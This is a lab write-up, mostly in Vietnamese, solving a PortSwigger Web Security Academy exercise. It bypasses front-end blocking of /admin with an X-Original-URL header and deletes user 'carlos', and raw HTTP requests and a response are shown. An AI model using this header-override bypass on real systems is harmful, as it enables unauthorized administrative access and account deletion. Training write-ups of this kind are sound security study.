@@ -1,0 +1,56 @@
+BROKEN ACCESS CONTROL: URL-based access control can be circumvented
+
+DESCRIBE: This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.
+To solve the lab, access the admin panel and delete the user carlos.
+
+ANALYSTIC
+---------
+Thực hiện đăng nhập bài lab, thử truy cập /admin, ta thấy hiển thị thông báo access dinied nhưng này là do front-end thực hiện chặn --> /admin không được bảo vệ ở back-end. Theo đề bài, front-end được cấu hình để chặn đường dẫn tới /admin, nhưng back-end được xâu dựng hỗ trợ X-Original-URL --> ta có thể tận dụng nó. Thực hiện 1 request tới trang home chặn nó lại và thêm trường sau: X-Original-URL: admin , khi đó request sẽ như sau:
+GET / HTTP/2
+Host: 0a9200c4046ae7ee81e6346d008000f2.web-security-academy.net
+Cookie: session=HMhwtOiR7uo25sgbNqeJFwIKt0g2WHun
+Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+X-Original-URL: /admin
+
+Ta được response như sau:
+HTTP/2 302 Found
+Location: /admin
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+--> ta thấy trang đã được chuyển hướng tới /admin, quan sát trong history có 2 response trả về 1 là từ chối cho request từ / nhưng 1 là thành công cho request từ /admin --> ta thực hiện truy cập vào trang admin thành công. Thực hiện thử xóa carlos ta lại bị quay lại từ chối:
+
+GET /admin/delete?username=carlos HTTP/2
+Host: 0a9200c4046ae7ee81e6346d008000f2.web-security-academy.net
+Cookie: session=HMhwtOiR7uo25sgbNqeJFwIKt0g2WHun
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a9200c4046ae7ee81e6346d008000f2.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+Tuy nhiên qua đây ta biết được đường dẫn để xóa người dùng, ta thực hiện 1 request tương tự khi truy cập admin tu nhiên lúc này endpoint của ta là: /?username=carlos và thêm trường: X-Original-URL: /admin/delete --> sau khi gửi request đi ta lại thấy kết quả là access dinied, tuy nhiên khi truy cập lại vào trang admin, ta thấy carlos đã bị xóa thành công.
+
+
+
